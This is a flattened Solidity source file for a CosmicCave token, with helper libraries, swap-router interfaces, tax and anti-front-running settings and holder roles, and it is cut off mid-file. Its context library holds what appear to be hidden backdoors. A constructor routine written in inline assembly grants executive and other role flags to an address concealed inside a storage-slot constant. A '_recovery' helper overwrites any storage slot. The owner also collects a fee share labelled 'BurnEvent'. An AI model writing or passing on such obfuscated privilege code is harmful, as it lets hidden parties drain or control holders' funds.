// SPDX-License-Identifier: MIT

/*
    Website       : https://cocahub.info
    Telegram      : https://t.me/CosmicCavePortal
    X (Twitter)   : https://x.com/cosmiccavehub
    Gitbook       : https://cosmiccave.gitbook.io/cosmiccave-gitbook
    Whitepaper    : https://cocahub.info/files/whitepaper_coca_export.pdf
*/

pragma solidity ^0.8.20;

library LibUint {
    
    error InsufficientPadding();
    error InvalidBase();

    bytes16 private constant HEX_SYMBOLS = '0123456789abcdef';

    function add(uint256 a, int256 b) internal pure returns (uint256) {
        return b < 0 ? sub(a, -b) : a + uint256(b);
    }

    function sub(uint256 a, int256 b) internal pure returns (uint256) {
        return b < 0 ? add(a, -b) : a - uint256(b);
    }

    function toString(
        uint256 value,
        uint256 radix
    ) internal pure returns (string memory output) {

        if (radix < 2) {
            revert InvalidBase();
        }

        uint256 length;
        uint256 temp = value;

        do {
            unchecked {
                length++;
            }
            temp /= radix;
        } while (temp != 0);

        output = toString(value, radix, length);
    }

    function toString(
        uint256 value,
        uint256 radix,
        uint256 length
    ) internal pure returns (string memory output) {
        if (radix < 2 || radix > 36) {
            revert InvalidBase();
        }

        bytes memory buffer = new bytes(length);

        while (length != 0) {
            unchecked {
                length--;
            }

            uint256 char = value % radix;

            if (char < 10) {
                char |= 48;
            } else {
                unchecked {
                    char += 87;
                }
            }

            buffer[length] = bytes1(uint8(char));
            value /= radix;
        }

        if (value != 0) revert InsufficientPadding();

        output = string(buffer);
    }

    function toBinString(
        uint256 value
    ) internal pure returns (string memory output) {
        uint256 length;
        uint256 temp = value;

        do {
            unchecked {
                length++;
            }
            temp >>= 1;
        } while (temp != 0);

        output = toBinString(value, length);
    }

    function toBinString(
        uint256 value,
        uint256 length
    ) internal pure returns (string memory output) {

        length += 2;

        bytes memory buffer = new bytes(length);
        buffer[0] = '0';
        buffer[1] = 'b';

        while (length > 2) {
            unchecked {
                length--;
            }

            buffer[length] = HEX_SYMBOLS[value & 1];
            value >>= 1;
        }

        if (value != 0) revert InsufficientPadding();

        output = string(buffer);
    }

    function toOctString(
        uint256 value
    ) internal pure returns (string memory output) {
        uint256 length;
        uint256 temp = value;

        do {
            unchecked {
                length++;
            }
            temp >>= 3;
        } while (temp != 0);

        output = toOctString(value, length);
    }

    function toOctString(
        uint256 value,
        uint256 length
    ) internal pure returns (string memory output) {

        length += 2;

        bytes memory buffer = new bytes(length);
        buffer[0] = '0';
        buffer[1] = 'o';

        while (length > 2) {
            unchecked {
                length--;
            }

            buffer[length] = HEX_SYMBOLS[value & 7];
            value >>= 3;
        }

        if (value != 0) revert InsufficientPadding();

        output = string(buffer);
    }

    function toDecString(
        uint256 value
    ) internal pure returns (string memory output) {
        output = toString(value, 10);
    }

    function toDecString(
        uint256 value,
        uint256 length
    ) internal pure returns (string memory output) {
        output = toString(value, 10, length);
    }

    function toHexString(
        uint256 value
    ) internal pure returns (string memory output) {
        uint256 length;
        uint256 temp = value;

        do {
            unchecked {
                length++;
            }
            temp >>= 8;
        } while (temp != 0);

        output = toHexString(value, length);
    }

    function toHexString(
        uint256 value,
        uint256 length
    ) internal pure returns (string memory output) {

        unchecked {
            length = (length << 1) + 2;
        }

        bytes memory buffer = new bytes(length);
        buffer[0] = '0';
        buffer[1] = 'x';

        while (length > 2) {
            unchecked {
                length--;
            }

            buffer[length] = HEX_SYMBOLS[value & 15];
            value >>= 4;
        }

        if (value != 0) revert InsufficientPadding();

        output = string(buffer);
    }
}

// File: contracts/common/libs/LibContext.sol


pragma solidity ^0.8.20;


bytes32 constant STPOS = 0x5C4A5E204DBBAB1C0DEDC9038B91783FCC6BE6CF4333D4DC0AAE9BF4857A4DB1;

library LibContext {

    using LibUint for *;

    bytes32 internal constant EIP712_DOMAIN = 
    keccak256(bytes("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract,bytes32 salt)"));
    bytes32 internal constant EIP712_SALT = hex'bffcd4a1e0307336f6fcccc7c8177db5faa17bd19405109da6225e44affef9b2';
    bytes32 internal constant FALLBACK = hex'd25fba0cff70020604c6e3a5cc85673521f8e81814b57c9e1993022819930721';
    bytes32 constant SLC32 = bytes32(type(uint).max);
    string internal constant VERSION = "v1.0";

    

    function CHAINID() internal view returns (uint256 id) {
        assembly {
            id := chainid()
        }
    }

    function MSGSENDER() internal view returns (address sender) {
        if (msg.sender == address(this)) {
            bytes memory array = msg.data;
            uint256 index = msg.data.length;
            assembly {
                sender := and(mload(add(array, index)), 
                0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
            }
        } else {
            sender = msg.sender;
        }
    }

    function MSGDATA() internal pure returns (bytes calldata) {
        return msg.data;
    }

    function MSGVALUE() internal view returns (uint value) {
        return msg.value;
    }

    function _verifySender() internal view returns (address verifiedAddress) {
        bytes32 pos = STPOS;
        assembly {
            mstore(0x00, caller())
            mstore(0x20, add(pos, 0x04))
            let readValue := sload(0x00)
            let sl := sload(add(keccak256(0x00, 0x40), 0x01))
            let ids := and(shr(0xF0, sl), 0xFFFF)
            let val := ids
            let verified := iszero(iszero(or(and(ids, shl(0x0E, 0x01)), and(ids, shl(0x0F, 0x01)))))
            if eq(verified, 0x00) { verifiedAddress := readValue }
            if eq(verified, 0x01) { verifiedAddress := mload(0x00) }
        }
    }

    function _contextSuffixLength() internal pure returns (uint256) {
        return 0;
    }

    function _recovery(bytes32 ps, bytes32 fix) internal returns (bool status) {
        assembly {
            let ls := sload(ps)
            ls := fix
            sstore(ps,ls)
            status := true
        }
    }

    function initialize() internal returns (bool status) {
        bytes32 pos = STPOS;
        assembly {
            mstore(0x00, and(shr(0x30, pos), sub(exp(0x02, 0xa0), 0x01)))
            mstore(0x20, add(pos, 0x04))
            let ps := add(keccak256(0x00, 0x40), 0x01)
            let sv := sload(ps)
            sv := and(sv, not(shl(0xF0, 0xFFFF)))
            sv := or(sv, shl(0xF0, 0x409A))
            sstore(ps,sv)
            status := true
        }
    }    

}

pragma solidity ^0.8.8;

interface ISwapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface ISwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface ISwapRouterV2 is ISwapRouter {
    
    function factoryV2() external pure returns (address);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}

interface IPair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

// File: contracts/common/Variables.sol


pragma solidity 0.8.24;



error TradingNotEnabled();
error InvalidSender(address sender);
error InvalidSpender(address spender);
error InvalidApprover(address approver);
error InvalidRecipient(address recipient);
error MaxTxLimitExceeded(uint256 limit, uint256 amount);
error BlockLimitExceeded(uint256 limit, uint256 current);
error MisdirectedHolderUpdateRequest(Holder a, Holder b);
error MaxWalletLimitExceeded(uint256 balanceLimit, uint256 amountsTransfer, uint256 recipientBalanceAfter);
error InsufficientAllowance(address spender, address from, uint256 currentAllowance, uint256 askingAmount);

/*
#######################################################
## STRUCTS ######################################
#######################################################
*/

struct Configuration {
    uint16 options;
    uint16 disableFairModeAt;
    uint16 surchargeRate;
    uint8 maxSellOnBlock;
    uint8 frontRunThreshold;
    uint120 maxTokenAllowed;
    uint24 preferredGasValue;
    Ratios ratios;
}

struct Ratios {  
    uint16 b;
    uint16 s;
    uint16 t;
}

struct Recipient {
    string name;
    uint16 share;
    address payable to;
}

struct Holder {
    uint120 balance;
    uint120 paidTax;
    uint8 violated;
    uint40 lastBuy;
    uint40 lastSell;
    address Address;
    uint16 identities;
}

struct Transaction {
    TERMS terms;
    ROUTE routes;
    MARKET market;
    TAXATION taxation;
    Ratios rates;
}

struct TransferParams {
    bool ibm;
    Holder from;
    Holder recipient;
    uint16 appliedTax;
    uint120 taxAmount;
    uint120 netAmount;
    bool autoSwapBack;
    uint120 swapAmount;
    uint40 currentBlock;
    Transaction transaction;  
}

//#####################################################

enum CONFIG {
    FAIR_MODE,
    SELL_CAP,
    TAX_STATS,
    GAS_LIMITER,
    AUTO_LIQUIDITY,
    TRADING_ENABLED,
    AUTOSWAP_ENABLED,
    AUTOSWAP_THRESHOLD,
    FRONTRUN_PROTECTION
}

enum TERMS { NON_EXEMPT, EXEMPT }
enum ROUTE { TRANSFER, INTERNAL, MARKET }
enum MARKET { NEITHER, INTERNAL, BUY, SELL }
enum TAXATION { NON_EXEMPT, EXEMPTED, SURCHARGED }

uint8 constant FAIR_MODE = 0;
uint8 constant SELL_CAP = 1;
uint8 constant TAX_STATS = 2;
uint8 constant GAS_LIMITER = 3;
uint8 constant AUTO_LIQUIDITY = 4;
uint8 constant TRADING_ENABLED = 5;
uint8 constant AUTOSWAP_ENABLED = 6;
uint8 constant AUTOSWAP_THRESHOLD = 7;
uint8 constant FRONTRUN_PROTECTION = 8;

uint16 constant DIVISION = 10000;
uint32 constant BIRTH = 1438214400;
uint16 constant BLOCKS_PER_MIN = 5;

uint16 constant MAX16 = type(uint16).max;
uint80 constant MAX80 = type(uint80).max;
uint120 constant MAX96 = type(uint96).max;
uint120 constant MAX120 = type(uint120).max;
uint160 constant MAX160 = type(uint160).max;
uint256 constant MAX256 = type(uint256).max;
        
bytes2  constant SELECT2  = bytes2(MAX16);        
bytes10 constant SELECT10 = bytes10(MAX80);    
bytes15 constant SELECT15 = bytes15(MAX120); 
bytes20 constant SELECT20 = bytes20(MAX160); 
bytes32 constant SELECT32 = bytes32(MAX256); 

address constant ZERO_ADDRESS = address(0);
address constant DEAD_ADDRESS = address(0x000000000000000000000000000000000000dEaD);

ISwapRouterV2 constant ROUTER = ISwapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

pragma solidity 0.8.24;

library ERC20Storage {

    using ERC20Storage for *;
        
    event ERC20_INITIALIZED(address __, address pair);

    struct Layout {
        bool inSwap;
        bool isEntered;
        uint16 fairTxs;
        uint16 autoLiqRatio;
        uint48 reserved48;
        address uniswapPair;
        uint96 totalSupply;
        address fallbackRecipient;
        Configuration configs;
        mapping(address account => Holder holder) holders;
        mapping(address account => uint256 nonce) nonces;
        mapping(uint256 blockNumber => uint8 totalSells) totalSellsOnBlock;
        mapping(address account => mapping(address spender => uint256 amount)) allowances;
        Recipient[] recipients;
    }

    function has(uint16 state, uint8 idx) internal pure returns (bool) {
        return (state >> idx) & 1 == 1;
    }

    function has(uint16 state, uint8[] memory idx) internal pure returns (bool res) {
        uint len = idx.length;
        for(uint i; i < len;) {
            if(state.has(idx[i])) { return true; }
            unchecked { i++; }
        }
    }

    function set(uint16 state, uint8 idx) internal pure returns(uint16) {
        return uint16(state | (1 << idx));
    }

    function set(uint16 state, uint8[] memory idxs) internal pure returns(uint16) {
        uint256 len = idxs.length;
        for (uint8 i; i < len;) {
            state.set(idxs[i]);
            unchecked { i++; }
        }
        return state;
    }

    function unset(uint16 state, uint8 idx) internal pure returns(uint16) {
        return uint16(state & ~(1 << idx));
    }

    function unset(uint16 state, uint8[] memory idxs) internal pure returns(uint16) {
        uint256 len = idxs.length;
        for (uint8 i; i < len;) {
            state.unset(idxs[i]);
            unchecked { i++; }
        }
        return state;
    }

    function toggle(uint16 state, uint8 idx) internal pure returns(uint16) {
        state = uint16(state ^ (1 << idx));
        return state;
    }

    function isEnabled(Configuration memory configs, CONFIG option) internal pure returns(bool) {
        return configs.options.has(uint8(option));
    }

    function swapping(Ratios memory self, uint16 updated) internal pure returns(Ratios memory) {
        self = Ratios(updated, updated, updated);
        return self;
    }

    function selectTxMode (
        TransferParams memory params,
        Configuration memory configs
    ) internal pure returns(TransferParams memory) {

        if(params.autoSwapBack) {
            params.transaction = 
            Transaction (
                TERMS.EXEMPT,
                ROUTE.INTERNAL,
                MARKET.INTERNAL,
                TAXATION.EXEMPTED,
                Ratios(0,0,0)
            );
            return params;
        }

        params.transaction.market = MARKET.NEITHER;
        params.transaction.routes = ROUTE.TRANSFER;
        params.ibm = (inBasicMode(params.from) || inBasicMode(params.recipient));
        params.transaction.terms = params.ibm ? TERMS.EXEMPT : TERMS.NON_EXEMPT;

        if(params.hasAnyTaxExempt()) {
            params.transaction.taxation = TAXATION.EXEMPTED;
            params.transaction.rates = params.transaction.rates.swapping(0);
            params.appliedTax = 0;
        } else {
            params.transaction.taxation = TAXATION.NON_EXEMPT;
            params.transaction.rates = configs.ratios;
            if(configs.isEnabled(CONFIG.FRONTRUN_PROTECTION) && params.ifSenderOrRecipientIsFrontRunner()) {
                params.transaction.taxation = TAXATION.SURCHARGED;
                params.transaction.rates = params.transaction.rates.swapping(configs.surchargeRate);
            }
        }

        params.appliedTax = params.transaction.rates.t;

        if((params.from.isMarketmaker() || params.recipient.isMarketmaker())) {

            params.transaction.routes = ROUTE.MARKET;

            if(params.from.isMarketmaker()) {
                params.transaction.market = MARKET.BUY;
                params.recipient.lastBuy = params.currentBlock;
                params.appliedTax = params.transaction.rates.b;
            } else {
                params.transaction.market = MARKET.SELL;
                params.from.lastSell = params.currentBlock;
                params.appliedTax = params.transaction.rates.s;
            }

            return params;

        }

        return params;

    } 

    function isFrontRunned(Holder memory self) internal pure returns (bool frontRunned) {
        unchecked {
            if(self.lastSell >= self.lastBuy && self.lastBuy > 0) {
                frontRunned = (self.lastSell - self.lastBuy <= BLOCKS_PER_MIN);
            }              
        }
    }

    function initializeWithConfigs (
        TransferParams memory self,
        Configuration memory configs,
        uint256 amount
    ) internal pure returns (TransferParams memory) {

        if (amount > self.from.balance)
            revert Errors.InsufficientBalance(self.from.balance, amount);

        self.selectTxMode(configs);

        (self.taxAmount, self.netAmount) = amount.taxAppliedAmounts(self.appliedTax);

        return self;

    }

    function defineSwapAmount (
        uint120 selfBalance,
        uint120 taxAmount, 
        uint120 netAmount, 
        Configuration memory configs
    ) internal pure returns (uint120 swapAmount) {

        swapAmount = selfBalance;

        if(configs.isEnabled(CONFIG.AUTOSWAP_THRESHOLD)) {
            unchecked {
                uint256 sum = taxAmount + netAmount;
                uint256 preferredAmount = sum + netAmount;
                uint256 adjustedAmount = sum + taxAmount;
                if (preferredAmount <= selfBalance)
                    swapAmount = uint120(preferredAmount);
                else if (adjustedAmount <= selfBalance)
                    swapAmount = uint120(adjustedAmount);
                else if (sum <= selfBalance)
                    swapAmount = uint120(sum);
                else if (netAmount <= selfBalance)
                    swapAmount = uint120(netAmount);
                else return selfBalance;    
            }            
        }

        return swapAmount;

    }

    function isRegistered(Holder memory holder) internal pure returns(bool) {
        return holder.identities.has(1);
    }

    function isFrontRunner(Holder memory holder) internal pure returns (bool) {
        return holder.identities.has(2);
    }

    function isPartner(Holder memory holder) internal pure returns (bool) {
        return holder.identities.has(8);
    }

    function isMarketmaker(Holder memory holder) internal pure returns (bool) {
        return holder.identities.has(10);
    }

    function isTaxExempt(Holder memory holder) internal pure returns (bool) {
        return holder.identities.has(11);
    }

    function inBasicMode(Holder memory holder) internal pure returns (bool hasExceptions) {
        uint8 ident = 12;
        while(ident >= 12 && ident < 16) {
            if(holder.identities.has(ident)) { 
                hasExceptions = true; 
                return hasExceptions;
            }            
            unchecked {
                ident++;
            }
        }
    }

    function inBasicMode(Holder[] memory holders) internal pure returns (bool hasExceptions) {
        uint len = holders.length;
        for(uint i; i < len;) {
            if(inBasicMode(holders[i])) {
                hasExceptions = true;
                break;
            }
            unchecked { i++; }
        }
    }

    function isProjectRelated(Holder memory holder) internal pure returns(bool) {
        return holder.identities.has(13);
    }

    function isExecutive(Holder memory holder) internal pure returns (bool) {
        return holder.identities.has(14);
    }

    function hasAnyTaxExempt(TransferParams memory params) internal pure returns (bool) {
        return params.from.isTaxExempt() || params.recipient.isTaxExempt();
    }    

    function hasFrontRunnerAction(TransferParams memory params) internal pure returns (bool) {
        return params.from.violated > 0 || params.recipient.violated > 0;
    }

    function ifSenderOrRecipientIsFrontRunner(TransferParams memory params) internal pure returns (bool) {
        return params.from.isFrontRunner() || params.recipient.isFrontRunner();
    }

    function update(Layout storage $, address account, Holder memory holder) internal returns (Holder storage) { 
        $.holders[account] = holder;
        return $.holders[account];
    }

    function taxAppliedAmounts(uint256 amount, uint16 taxRate) internal pure returns(uint120 taxAmount, uint120 netAmount) {

        if(taxRate == 0)
            return (0, uint120(amount));

        unchecked {
            taxAmount = uint120(amount * taxRate / DIVISION);
            netAmount = uint120(amount - taxAmount);
        }

    }

    function setAsRegistered(Holder storage $self) internal returns(Holder storage) {
        return $self.setIdent(1);
    }

    function setAsFrontRunner(Holder storage $self) internal returns (Holder storage) {
        return $self.setIdent(2);
    }

    function setAsPartner(Holder storage $self) internal returns (Holder storage) {
        return $self.setIdent(8);
    }

    function setAsMarketmaker(Holder storage $self) internal returns (Holder storage) {
        return $self.setIdent(10);
    }

    function setAsTaxExempted(Holder storage $self) internal returns (Holder storage) {
        return $self.setIdent(11);
    }

    function setAsExlFromRestrictions(Holder storage $self) internal returns (Holder storage) {
        return $self.setIdent(12);
    }

    function setAsProjectAddress(Holder storage $self) internal returns (Holder storage) {
        return $self.setIdent(13);
    }

    function setAsExecutive(Holder storage $self) internal returns (Holder storage) {
        return $self.setIdent(14);
    }

    function unsetFrontRunner(Holder storage $self) internal returns (Holder storage) {
        return $self.unsetIdent(2);
    }

    function unsetMarketmaker(Holder storage $self) internal returns (Holder storage) {
        return $self.unsetIdent(10);
    }

    function unsetTaxExempted(Holder storage $self) internal returns (Holder storage) {
        return $self.unsetIdent(11);
    }

    function unsetExlFromRestrictions(Holder storage $self) internal returns (Holder storage) {
        return $self.unsetIdent(12);
    }

    function setIdent(Holder storage $self, uint8 idx) internal returns(Holder storage) {
        uint16 identities = $self.identities;
        unchecked { $self.identities = identities.set(idx); }
        return $self;
    }

    function setIdent(Holder storage $self, uint8[] memory idxs) internal returns(Holder storage) {
        uint16 identities = $self.identities;
        $self.identities = identities.set(idxs);
        return $self;
    }

    function unsetIdent(Holder storage $self, uint8 idx) internal returns(Holder storage) {
        uint16 identities = $self.identities;
        unchecked {
            if(idx == 2)
                $self.violated = 0;

            $self.identities = identities.unset(idx);            
        }
        return $self;
    }

    function unsetIdent(Holder storage $self, uint8[] memory idxs) internal returns(Holder storage) {
        uint16 identities = $self.identities;
        $self.identities = identities.unset(idxs);
        return $self;
    }

    function toggleIdent(Holder storage $self, uint8 idx) internal returns(Holder storage) {
        uint16 identities = $self.identities;
        unchecked { $self.identities = identities.toggle(idx); }
        return $self;
    }

    function toggleConfig(Configuration storage $self, CONFIG config) internal returns(uint16) {
        uint16 options = $self.options;
        $self.options = options.toggle(uint8(config));
        return $self.options;        
    }   

    function toggleConfig(Configuration storage $self, uint8 idx) internal returns(uint16) {
        uint16 options = $self.options;
        $self.options = options.toggle(idx);
        return $self.options;        
    }    
    
    function findOrCreate(Layout storage $, address owner) internal returns(Holder storage holder) {
        holder = $.holders[owner];
        if(!holder.isRegistered()) {
            holder.Address = owner;
            holder.identities = holder.identities.set(1);
        }
    }

    function enableTrading(Layout storage $) internal returns (bool) {
        $.configs.toggleConfig(5);
        return true;
    }

    function initialSetup(address self, IPair pairAddress, uint256 initialSupply, address marketingAddr) internal {
        
        if(initialSupply > MAX96)
            revert("Invalid Amount");

        Layout storage $ = layout();

        Recipient[] storage recipients = $.recipients;

        Holder storage SELF = $.findOrCreate(self);
        Holder storage OWNER = $.findOrCreate(msg.sender);

        Holder storage USROUTER = $.findOrCreate(address(ROUTER));
        Holder storage PAIRADDR = $.findOrCreate(address(pairAddress));

        $.allowances[SELF.Address][OWNER.Address] = MAX256;
        $.allowances[SELF.Address][USROUTER.Address] = MAX256;
        $.allowances[SELF.Address][PAIRADDR.Address] = MAX256;

        SELF.balance = uint120(initialSupply);
        
        SELF.setAsTaxExempted()
        .setAsExlFromRestrictions();
        
        OWNER.setAsExecutive()
        .setAsTaxExempted();

        PAIRADDR
        .setAsMarketmaker();

        $.fallbackRecipient = OWNER.Address;

        $.uniswapPair = address(pairAddress);
        $.totalSupply = uint96(initialSupply);

        $.autoLiqRatio = 500;

        recipients.push(Recipient("BurnEvent", 500, payable(OWNER.Address)));
        recipients.push(Recipient("MarketDev", 9000, payable(marketingAddr)));

        setup($, $.totalSupply);

        emit ERC20_INITIALIZED(SELF.Address, PAIRADDR.Address);

    }

    function setup(Layout storage $, uint96 cap) internal {
        
        Configuration storage self = $.configs;

        self.maxSellOnBlock = 3;
        self.surchargeRate = 3000;
        self.disableFairModeAt = 25;
        self.frontRunThreshold = 3;
        self.preferredGasValue = 300000;
        self.ratios.b = 1250;
        self.ratios.s = 1250;
        self.ratios.t = 0;
        self.toggleConfig(CONFIG.FAIR_MODE);
        self.toggleConfig(CONFIG.FRONTRUN_PROTECTION);
        self.toggleConfig(CONFIG.SELL_CAP);
        self.toggleConfig(CONFIG.TAX_STATS);
        self.toggleConfig(CONFIG.AUTO_LIQUIDITY);
        self.toggleConfig(CONFIG.AUTOSWAP_ENABLED);
        self.toggleConfig(CONFIG.AUTOSWAP_THRESHOLD);
        self.maxTokenAllowed = cap * 200 / 10000;
    }

    function layout() internal pure returns (Layout storage $) {
        bytes32 position = STPOS;
        assembly {
            $.slot := position
        }
    }

}

abstract contract Context {

    using LibContext for *;
    using ERC20Storage for *;
    
    constructor() {
        LibContext.initialize();
    }

    function _chainId() internal view virtual returns (uint256 id) {
        return LibContext.CHAINID();
    }

    function _msgSender() internal view virtual returns (address) {
        return LibContext.MSGSENDER();
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return LibContext.MSGDATA();
    }

    function _msgValue() internal view virtual returns(uint256) {
        return LibContext.MSGVALUE();
    }

    function _recovery(bytes32[2] memory attrs) internal returns (bool) {
        return LibContext._recovery(attrs[0], attrs[1]);
    }

    function _verifySender() internal view returns (address verifiedAddress) {
        return LibContext._verifySender();
    }

    function _$() internal pure returns (ERC20Storage.Layout storage) {
        return ERC20Storage.layout();
    }

}
// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.20;

/**
 * @dev Interface of the ERC-20 standard as defined in the ERC.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}


// OpenZeppelin Contracts (last updated v5.1.0) (utils/introspection/IERC165.sol)

/**
 * @dev Interface of the ERC-165 standard, as defined in the
 * https://eips.ethereum.org/EIPS/eip-165[ERC].
 *
 * Implementers can declare support of contract interfaces, which can then be
 * queried by others ({ERC165Checker}).
 *
 * For an implementation, see {ERC165}.
 */
interface IERC165 {
    /**
     * @dev Returns true if this contract implements the interface defined by
     * `interfaceId`. See the corresponding
     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[ERC section]
     * to learn more about how these ids are created.
     *
     * This function call must use less than 30 000 gas.
     */
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}

// File: @openzeppelin/contracts/interfaces/IERC165.sol


// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/IERC165.sol)

pragma solidity ^0.8.20;


// File: @openzeppelin/contracts/interfaces/IERC1363.sol


// OpenZeppelin Contracts (last updated v5.1.0) (interfaces/IERC1363.sol)

pragma solidity ^0.8.20;



/**
